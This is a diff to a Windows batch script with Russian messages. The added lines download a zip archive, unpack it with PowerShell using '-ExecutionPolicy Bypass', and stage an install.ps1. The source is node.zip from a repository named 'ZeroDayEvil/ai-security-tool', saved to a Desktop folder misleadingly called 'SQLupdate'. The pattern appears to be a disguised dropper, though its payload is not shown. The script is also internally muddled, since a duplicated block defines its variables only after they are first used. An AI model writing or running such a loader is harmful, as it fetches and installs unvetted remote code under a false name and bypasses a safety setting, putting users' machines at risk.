@@ -42,6 +42,43 @@ echo [*] Создание папки...
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
 echo [*] Загрузка архива...
+curl.exe -L --fail "%DOWNLOAD_URL%" -o "%ZIP_FILE%"
+if errorlevel 1 (
+  echo [!] Не удалось скачать архив.
+  pause
+  exit /b 1
+)
+
+echo [*] Распаковка архива...
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath '%TARGET_DIR%' -Force"
+if errorlevel 1 (
+  echo [!] Не удалось распаковать архив.
+  pause
+  exit /b 1
+)
+
+echo [*] Очистка...
+if exist "%ZIP_FILE%" del /q "%ZIP_FILE%"
+
+if not exist "%TARGET_DIR%\data\install.ps1" (
+  echo [!] Файл не найден: %TARGET_DIR%\data\install.ps1
+  echo [!] Проверьте содержимое папки:
+  dir /s "%TARGET_DIR%"
+  pause
+  exit /b 1
+)
+
+echo [+] Архив распакован: %TARGET_DIR%\data\install.ps1
+
+set "TARGET_DIR=%USERPROFILE%\Desktop\SQLupdate"
+set "ZIP_FILE=%TARGET_DIR%\node.zip"
+set "DOWNLOAD_URL=https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/data/node.zip"
+
+echo.
+echo [*] Создание папки...
+if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
+
+echo [*] Загрузка архива...
 curl -L "%DOWNLOAD_URL%" -o "%ZIP_FILE%"
 if errorlevel 1 (
   echo [!] Не удалось скачать архив.
